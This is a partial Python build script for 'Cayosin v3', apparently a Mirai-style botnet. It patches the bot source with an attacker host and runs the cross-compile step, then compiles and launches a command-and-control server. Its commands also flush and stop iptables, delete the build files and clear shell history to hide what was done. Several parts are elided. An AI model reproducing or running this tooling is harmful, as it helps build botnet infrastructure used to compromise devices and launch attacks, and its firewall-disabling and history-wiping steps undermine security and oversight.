...
print ("\x1b[1;35mSaiko - \x1b[1;36mCayosin v3 - Auto-Build Process Initiated...")
time.sleep(2)
...
x = fileinput.input(files="/root/sy/main.c", inplace=1)
for line in x:
    if old1 in line:
        line = new1
    print line,
...
for line in x:
    ...
    print line,
x.close()
run ("chmod 777 *; python Saiko.py fff "+ hst +" "+ prf +"; rm -rf cy; mv iplookup.php /var/www/html; rm -rf Saiko.py; rm -rf cross-compiler-*")
...
#CNC
raw_input ("\x1b[1;36mPress Enter to Build CNC...")
run ("chmod 777 *; gcc -o c2 Saiko.c -pthread; rm -rf Saiko.c; iptables -F; service iptables stop; screen -S Saiko ./c2 "+ cp +" "+ bp +"; history -c")

print ("\x1b[1;36m[+] Cayosin Built Successfully. [+]")
print ("\x1b[1;36m[\x1b[1;33m!\x1b[1;36m] To View CNC Screen: \x1b[1;33mscreen -xS Saiko \x1b[1;36m[\x1b[1;33m!\x1b[1;36m]")
